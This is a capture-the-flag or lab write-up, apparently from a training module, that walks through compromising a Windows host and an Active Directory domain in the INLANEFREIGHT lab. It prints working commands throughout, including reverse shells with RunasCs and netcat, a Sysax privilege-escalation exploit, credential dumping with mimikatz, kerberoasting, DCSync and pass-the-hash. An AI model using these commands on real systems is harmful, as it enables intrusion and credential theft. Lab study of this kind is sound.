# 172.16.8.50 - ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/AEN]
‚îî‚îÄ$ sudo nmap 172.16.8.50 -p- -sV -sC -T4                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 19:33 EST
Nmap scan report for 172.16.8.50
Host is up (0.038s latency).
Not shown: 65493 closed tcp ports (reset), 26 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-AEN-MS0
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-13T00:45:14+00:00
|_ssl-date: 2025-12-13T00:45:25+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-12-11T23:25:50
|_Not valid after:  2026-06-12T23:25:50
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Apache Tomcat (language: en)
|_http-title: Apache Tomcat/10.0.21
|_http-favicon: Apache Tomcat
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-13T00:45:14
|_  start_date: N/A
|_nbstat: NetBIOS name: ACADEMY-AEN-MS0, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:b9:5d (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
```

We can rdp with ssmalls

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/AEN/target/DEV01]
‚îî‚îÄ$ nxc rdp ACADEMY-AEN-MS01.inlanefreight.local -u ssmalls -p Hacked@123 
RDP         172.16.8.50     3389   ACADEMY-AEN-MS0  [*] Windows 10 or Windows Server 2016 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (nla:True)
RDP         172.16.8.50     3389   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\ssmalls:Hacked@123
```

RDP did not work

We list the shares on the DC

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/AEN]
‚îî‚îÄ$ nxc smb DC01.inlanefreight.local -u ssmalls -p Hacked@123 --shares                      
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Hacked@123 
SMB         172.16.8.3      445    DC01             [*] Enumerated shares
SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
SMB         172.16.8.3      445    DC01             -----           -----------     ------
SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.8.3      445    DC01             C$                              Default share
SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
```

In the IT folder of the Department share

```shellscript
smb: \IT\Private\Development\> ls 
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022
```

Inside the file, we find some creds

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/AEN]
‚îî‚îÄ$ cat SQL\ Express\ Backup.ps1 
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"
```

backupadm:!qazXSW@

backupadm can winrm to MS01

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/AEN]
‚îî‚îÄ$ nxc winrm ACADEMY-AEN-MS01.inlanefreight.local -u backupadm -p '!qazXSW@'                                   
WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) 
WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
```

We connect with evil winrm

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads]
‚îî‚îÄ$ evil-winrm -i ACADEMY-AEN-MS01.inlanefreight.local -u backupadm -p '!qazXSW@'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\backupadm\Documents>
```

In panther\unattended.xml we find a password for the user ilfserveradm

```shellscript
*Evil-WinRM* PS C:\panther> cat unattend.xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <InputLocale>de-de</InputLocale>
            <SystemLocale>de-de</SystemLocale>
            <UILanguage>de-de</UILanguage>
            <UILanguageFallback>de-de</UILanguageFallback>
            <UserLocale>de-de</UserLocale>
        </component>
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
```

ilfserveradm:Sys26Admin

We also find 2 files : budget\_data.xlsx and Inlanefreight.kdbx, but they are both password protected

We get the hash for the keepass DB and attempt to crack it

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads]
‚îî‚îÄ$ keepass2john Inlanefreight.kdbx > hash

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (Inlanefreight)
```

We get the following passwords

Administrator:Password\_123

mssql:Super@123

Michael321:12345

We can test the creds found in the unattended.xml file

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ nxc smb ACADEMY-AEN-MS01.inlanefreight.local -u ilfserveradm -p 'Sys26Admin' --local-auth 
SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:ACADEMY-AEN-MS0) (signing:False) (SMBv1:None)
SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [+] ACADEMY-AEN-MS0\ilfserveradm:Sys26Admin
```

We can use RunasCs to get a shell as that user

```shellscript
*Evil-WinRM* PS C:\Users\backupadm> .\runascs.exe "ilfserveradm" "Sys26Admin" powershell -r 172.16.8.120:9001

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-111624$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2144 created in background.

‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ penelope -p 9001           
[+] Listening for reverse shells on 0.0.0.0:9001 ‚Üí  127.0.0.1 ‚Ä¢ 192.168.198.134 ‚Ä¢ 172.19.0.1 ‚Ä¢ 172.20.0.1 ‚Ä¢ 172.17.0.1 ‚Ä¢ 172.18.0.1 ‚Ä¢ 10.10.15.78
‚û§  üè† Main Menu (m) üíÄ Payloads (p) üîÑ Clear (Ctrl-L) üö´ Quit (q/Ctrl-C)
[+] Got reverse shell from ACADEMY-AEN-MS0~127.0.0.1-Microsoft_Windows_Server_2019_Standard-x64-based_PC üòç Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/ACADEMY-AEN-MS0~127.0.0.1-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2025_12_13-12_09_59-126.log üìú
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
PS C:\Windows\system32> whoami
whoami
academy-aen-ms0\ilfserveradm
```

We find an uncommon service : SysaxAutomation

```shellscript
PS C:\Program Files (x86)> ls 
ls 


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/1/2022   2:25 PM                Common Files                                                          
d-----        2/25/2022  10:20 AM                Internet Explorer                                                     
d-----        9/15/2018   2:19 AM                Microsoft.NET                                                         
d-----         6/1/2022   2:23 PM                Mozilla Maintenance Service                                           
d-----         6/1/2022   2:22 PM                SysaxAutomation
```

We find the version in the readme.txt file

```shellscript
PS C:\Program Files (x86)\SysaxAutomation> cat readme.txt
cat readme.txt
  -------[ README.TXT ] -------------------------------------------
  Program       : Sysax FTP Automation
  Version       : 6.90
```

We need to follow the steps

```shellscript
# Exploit:
Logged in as low privileged account

1. Create folder c:\temp
2. Download netcat (nc.exe) to c:\temp
3. Create file 'pwn.bat' in c:\temp with contents
	c:\temp\nc.exe localhost 1337 -e cmd
4. Open command prompt and netcat listener
	nc -nlvvp 1337
5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
6. Select Setup Scheduled/Triggered Tasks
	- Add task (Triggered)
	- Update folder to monitor to be c:\temp
	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
	- Uncheck 'Login as the following user to run task'
	- Finish and Save
7. Create new text file in c:\temp
8. Check netcat listener
	C:\WINDOWS\system32>whoami
	whoami
	nt authority\system
```

Our user can rdp, so we will use that

```shellscript
PS C:\Program Files (x86)> net user ilfserveradm
net user ilfserveradm
User name                    ilfserveradm
Full Name                    ilfserveradm
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 1:17:17 PM
Password expires             Never
Password changeable          6/1/2022 1:17:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/13/2025 2:14:17 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users 
Global Group memberships     *None
```

We transfer the files and run the app

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fr6Gk0FyEhWExl4KLFBlK%2Fimage.png?alt=media&#x26;token=3d8ef6e1-e079-4f1b-9d50-e26806133a61" alt=""><figcaption></figcaption></figure>

We follow the instructions, finally we create a file and get a shell

```shellscript
PS C:\temp> echo "exec" > exec
echo "exec" > exec

‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ rlwrap nc -lnvp 9002
listening on [any] 9002 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45042
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
33a9d46de4015e7b3b0ad592a9394720
```

We now need to dump the creds from the machine. Remote dumping did not work so we download mimikatz

```shellscript
PS C:\Users\Administrator\Desktop> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 0850f84bbd902729bb3af737405cc788
```

If we run the shortest path to domain admins, we see the following

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FfglXUDcxgfG1gecEVjLb%2Fimage.png?alt=media&#x26;token=d09bbfcc-a525-4579-a85f-74071aebd0bb" alt=""><figcaption></figcaption></figure>

We need to get the credentials for mssqladm, who has a session in MS01. We need to dump LSASS

```shellscript
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 248503 (00000000:0003cab7)
Session           : Interactive from 1
User Name         : mssqladm
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/13/2025 2:10:08 PM
SID               : S-1-5-21-2814148634-3729814499-1637837074-4623
        msv :
         [00000003] Primary
         * Username : mssqladm
         * Domain   : INLANEFREIGHT
         * NTLM     : 31311a46c8a625d2df6a33af4cac1e21
         * SHA1     : 6bb4405bf0d83fd7ff284be24973b0dab4157f01
         * DPAPI    : 508b6bcb5a435a8e6f2f9e9bc92e4a6c
```

Check the creds for mssqladm

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ nxc smb DC01.inlanefreight.local -u mssqladm -H 31311a46c8a625d2df6a33af4cac1e21
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssqladm:31311a46c8a625d2df6a33af4cac1e21
```

We have generic write over ttimmons. Shadow credentials attack didn't work. Targeted kerberoasting from linux didn't work. So I added a SPN with bloodyAD, but couldn't get nxc to work with the --kerberoasting option, so I used Rubeus to retreive the hash

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ bloodyAD -d inlanefreight.local --host DC01.inlanefreight.local -u 'mssqladm' -p :31311a46c8a625d2df6a33af4cac1e21 set object ttimmons servicePrincipalName -v 'inlanefreight.local/meow'      
[+] ttimmons's servicePrincipalName has been updated
```

```shellscript
PS C:\Users\Administrator\Desktop> .\Rubeus.exe kerberoast /user:ttimmons /nowrap
.\Rubeus.exe kerberoast /user:ttimmons /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : ttimmons
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=ttimmons)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : ttimmons
[*] DistinguishedName      : CN=ttimmons,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : inlanefreight.local/meow
[*] PwdLastSet             : 6/1/2022 1:32:18 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$inlanefreight.local/meow@INLANEFREIGHT.LOCAL*$67C7A491F15AA3CAFA3F4BF7A62778EC$57957B2D25E5DCB5A932958327114EED95C1FCBB37BAA27EA7E5C4DAAC7DA4150B158726991FA231DD4A1D273D027157EA3895EDF059F3F8476D0A837D60321C29D60D70955D24AF0AEBD538DBF1B225FC5FE04622E0F14D9911AA7DC3037D2748EAEA79F1AEC0A5B2B7D0993D1737C1F710C9CB2C7049574497661CE81E61D9E33882E4F2CB58EB637904816466E9D3166E4A797EAB9BA95087E7A74DB8B0BC276DC56C50476A60B534B56F31244C0031CC0339C5841A07523A0B6AB2172CA9D5FAB0B27F7AFA0B71B1A414585FECF66394C9F4E2029460D168D9CF7D5BB9F64ED17D64A2846179624D410860A90EAF62C4DDF031526AB0FAFCD32FFDEDFB8005290C9254A5EBF93E6194005F56D78CFAFA4FF305ABCBD15EC080075C5CC94E29E34CC6D815F59FAA6751D9D6D30FAF6DF4BE5E45EC80B7646730F78C88A2D422B9257453F124FCE7162110F675A4DCDE52448BBDC966B7B2FEAE6FE26AB23EE7571013CD998A4CF2726B4E5C66B13BAF236C1EC27B948E5ED1DE08D43446601FCF362009E12735B831A09FA343037EE5F6B571842233835A7B9E91167168203710B428EE8DDE7BCC71C2254CC49526A634E297C88D35ECCBFC0AFE08BDA97B2B129DC12E725ABE2D40B1229C1E5D9CFC818C39F870A2113324D499566F95516C3E748A8FBB00BEFB22C63660328D767A4763ACF20515B797519A12BECF4881F73B2D3684AEF8E067365E1447B37994C3C5F5615F3A606CFA404D1F922735E670F6FD33D8FC763345A9B66D0DB8163F20DF7AE2EACF7AA1F2F72BCFBBC19A3BFB987106772864FE33955BB8F58AF071DC28822C192F95E5D221DCBE6CA8BD0C07113D2FAC27FA420506559C8C4988AB28357AAB8C0CFAD624A166E9DAA1523E758B0D3F3E4A0933E54487B3977203206E5369D7A110C3C987974DB066515B1FACEE151E332D10AFD33B6783DE4347C183E9E23D93B2552462F763FD16761E64AF0FB4AB2FACE5D9FFFED4669AD2ABCCBFB74A9E9DFA3BBF2A2E6E1EBD270C6B12AD254DAC38F6375D602D114C8317346321E1B5ECC01D6A8E8DAF4AFE77FB010CE032B6BC9094274BAEE747F8246BA435EDECB3818309B54F73935E040ECA14888FBF97A68E3EB6E9291AE746912D2F2910545895B9B68B9A49015FF65FB091BDD38A891BE46A39B07017B7027E5635183EC7009C0834A9ABDAC5C44A43606E6A930F1BC71F825E8332967C5E1A4C3E4FE4C98B54EB0D5898EE57FD580179EA0D529B2C6FC503F414F592FE2D7D0E423CDFEE7BD27B928C5DB22E8A42774683C1BE32189BE5087D45C8896DBD348F7A836651EE4A5DE7009ACE196A4642F7F036ABCEAE46906827897D98652E0B0D4DA6711298626706ECE04E2AC85CA1F823EB2DFE344189EA34BC04C13D07525A078CDDE7F31869086AB15CCFE8EF3126697DDEB9D566404346FE342689A4F768DF3EC24706C522EFE6A26F557BABCBE52FC2BA8CF778AF91290A46194E46007EB9F8848575A1A89A81D0D5EA58D5FF8C777268BBBB2FF11B210F9B2171DB83D9F91EE9865AAC4EC409618E96DEC272A7C4092C851CF482AFC2A2A3C831E800B67400D08995D6091BFCACA322FBF6DD35C53C815D03C014
```

We crack the password

```shellscript
ttimmons:Repeat09
```

Test the creds

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ nxc smb DC01.inlanefreight.local -u ttimmons -p 'Repeat09'                   
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ttimmons:Repeat09
```

We now have genericAll over the Server admins group. We can add ourself in that group

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ bloodyAD -d inlanefreight.local --host DC01.inlanefreight.local -u ttimmons -p Repeat09 add groupMember 'Server admins' ttimmons 
[+] ttimmons added to Server admins

# Confirm we are part of the group
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ bloodyAD -u ttimmons -d inlanefreight.local -p Repeat09 --host DC01.inlanefreight.local get object 'Server admins' --attr member 

distinguishedName: CN=Server Admins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
member: CN=ttimmons,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

That group can DCSync the DC

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ secretsdump.py inlanefreight.local/ttimmons:Repeat09@DC01.inlanefreight.local -just-dc-user Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:547ff3f4cc75b6dbfe7fee1f7e3f966d0bc6e689858dc25250c8f9a4191b8b91
Administrator:aes128-cts-hmac-sha1-96:0477b3d27dd7e44398b27b3d69a9fb43
Administrator:des-cbc-md5:61e31c8c2c0bd9cd
[*] Cleaning up...
```

Check the creds

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ nxc smb DC01.inlanefreight.local -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\Administrator:fd1f7e5564060258ea787ddbb6e6afa2 (Pwn3d!)
```

We can finally login to the DC

```shellscript
‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows]
‚îî‚îÄ$ psexec.py inlanefreight.local/Administrator@DC01.inlanefreight.local -hashes :fd1f7e5564060258ea787ddbb6e6afa2
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.inlanefreight.local.....
[*] Found writable share ADMIN$
[*] Uploading file HOlvFypG.exe
[*] Opening SVCManager on DC01.inlanefreight.local.....
[*] Creating service rviq on DC01.inlanefreight.local.....
[*] Starting service rviq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```shellscript
7c09eb1fff981654a3bb3b4a4e0d176a
```
